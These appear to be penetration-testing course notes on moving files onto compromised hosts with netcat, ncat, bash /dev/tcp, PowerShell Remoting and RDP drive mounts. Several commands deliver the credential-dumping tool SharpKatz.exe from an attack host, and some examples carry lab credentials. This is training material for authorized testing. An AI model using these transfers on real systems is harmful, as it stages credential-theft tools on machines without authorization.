# File Transfer with Netcat and Ncat

## NetCat - Compromised Machine - Listening on Port 8000

```sh
nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

## Ncat - Compromised Machine - Listening on Port 8000

```sh
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

## Netcat - Attack Host - Sending File to Compromised machine

The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

```sh
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Ncat - Attack Host - Sending File to Compromised machine

By utilizing `Ncat` we use `--send-only` rather than `-q`

```sh
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

---

Instead of listening on the compromised host, we can connect to  a port on our attack host to do the file transfer.

## Attack Host - Sending File as Input to Netcat

```sh
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## Compromised Machine Connect to Netcat to Receive the File

```sh
nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:
## Attack Host - Sending File as Input to Ncat

```sh
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Compromised Machine Connect to Ncat to Receive the File

```sh
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).
## NetCat - Sending File as Input to Netcat

```sh
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## Ncat - Sending File as Input to Ncat

```sh
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```sh
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

# PowerShell Session File Transfer

We might face scenarios where HTTP, HTTPS, and SMB are not available while trying to transfer files with PowerShell. We can use **PowerShell Remoting** (AKA **WinRM**), to perform the operation.
PS Remoting create two listeners. TCP/5985 for HTTP, and TCP/5986 for HTTPS.

```ad-important
To create a PSRemote Session, we need, **administrative access**, be a member of **Remote Management Users** group, or have explicit permessions to use PSRemoting
```

We can use the following command to check if there's a connection to the another host (TCP Test)

```PowerShell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

## Create a PowerShell Remoting Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

We can use `Copy-Item` cmdlet to copy a file from our local machine to another host.
## Copy Files from our Localhost to the Session

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

## Copy Files from Session to our Localhost

```PowerShell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

# RDP

## Mounting a Linux Folder using rdesktop

```sh
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```
## Mounting a Linux Folder Using xfreerdp

```sh
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

Alternatively, from **Windows**, the native `mstsc.exe` remote desktop client can be used.

![[mstsc.png]]

After selecting the drive, we can interact with it in the remote session that follows.

```ad-note
This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.
```

